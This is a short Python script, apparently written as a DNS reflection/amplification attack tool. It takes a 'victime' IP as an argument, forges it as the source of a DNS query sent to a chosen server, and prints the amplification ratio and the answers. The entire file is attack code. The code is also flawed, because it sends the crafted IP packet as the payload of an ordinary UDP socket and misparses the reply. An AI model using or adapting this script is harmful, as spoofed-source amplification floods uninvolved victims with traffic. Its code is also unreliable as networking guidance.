from scapy.all import *

import sys

import socket

server_ip = sys.argv[1]

victime_ip = sys.argv[2]

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

packet = IP(dst=server_ip, src=victime_ip) / UDP(dport=53, sport=5530) / DNS(id=12, qd=DNSQR(qname='twitter.com', qtype='A'))

sock.sendto(raw(packet), (server_ip, 53))

data, address = sock.recvfrom(1024)

data = raw(data)

response = IP(_pkt=data) / UDP(_pkt=data) / DNS(_pkt=data)

print(len(response) / len(packet))

if response.haslayer(DNS) :

	for i in range(response[DNS].ancount) :

		print(response[DNS].an[i].rdata)